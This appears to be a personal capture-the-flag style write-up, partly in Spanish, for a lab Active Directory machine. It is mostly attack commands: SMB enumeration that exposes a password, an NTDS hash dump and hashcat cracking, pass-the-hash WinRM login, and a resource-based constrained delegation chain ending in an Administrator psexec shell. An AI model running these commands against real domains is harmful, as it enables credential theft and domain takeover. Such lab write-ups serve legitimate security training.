#InProgress 
```IP
192.168.154.175
```
## Nmap
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-10-25 09:43:12Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125 
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125 
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125                                                                          
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
```

## Nmap UDP


# Enumeration
## SMB
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025114625.png?raw=true)
```
enum4linux -a -u "" -p "" 192.168.154.175 && enum4linux -a -u "guest" -p "" 192.168.154.175
```

```index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god                                                                                                                         
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert                                                                                                                                     
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain                                                                                                      
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist                                                                                                                                 
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer                                                                                                                                            
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account                                                                                                                       
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin                                                                                                                                              
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin                                                                                                                                           
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer                                                                                                                                     
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin                                                                                                                                        
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist                                               index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!                                                                                                              
user:[Administrator] rid:[0x1f4]                                                                                                                                                                                                            
user:[Guest] rid:[0x1f5]                                                                                                                                                                                                                    
user:[krbtgt] rid:[0x1f6]                                                                                                                                                                                                                   
user:[M.Mason] rid:[0x44f]                                                                                                                                                                                                                  
user:[K.Keen] rid:[0x450]                                                                                                                                                                                                                   
user:[L.Livingstone] rid:[0x451]                                                                                                                                                                                                            
user:[J.Johnson] rid:[0x452]                                                                                                                                                                                                                
user:[V.Ventz] rid:[0x453]                                                                                                                                                                                                                  
user:[S.Swanson] rid:[0x454]                                                                                                                                                                                                                
user:[P.Parker] rid:[0x455]                                                                                                                                                                                                                 
user:[R.Robinson] rid:[0x456]                                                                                                                                                                                                               
user:[D.Durant] rid:[0x457]                                                                                                                                                                                                                 
user:[G.Goldberg] rid:[0x458] 
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025120730.png?raw=true)
```
smbclient -U 'V.Ventz' --password='HotelCalifornia194!' \\\\192.168.154.175\\'Password Audit'
```

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
```
hashcat -m 1000 -w 3 -a 0 -p : --session=all — username -o ./cracked.out --outfile-format=3 ./secrets.dump.ntds /usr/share/wordlists/rockyou.txt --potfile-path ./hashcat.pot
```
## WINRM
```
nxc winrm 192.168.154.175 -u users.txt -H hashes.txt
```
```
evil-winrm -i 192.168.154.175 -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'
```
Nos deja entrar!
## RDP
pwned!
resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
No funciona, se desconecta al poco
## HTTP

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025132137.png?raw=true)


## Automated

### Peass
### Mimikatz
### Bloodhound
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025154635.png?raw=true)
Creamos un ordenador en el dominio
```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.154.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'Password123!'
```
Modify Delegation rights of ATTACK to impersonate other users
```
python3 rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "ATTACK$" -dc-ip 192.168.154.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
```
requesting TGS
```
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'Password123!' -impersonate Administrator -dc-ip 192.168.154.175
```
exporting the ticket
```
export KRB5CCNAME=$PWD/Administrator.ccache
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025165358.png?raw=true)
Add the domain to /etc/hosts
and connect with psexec
```
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.154.175
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025183317.png?raw=true)
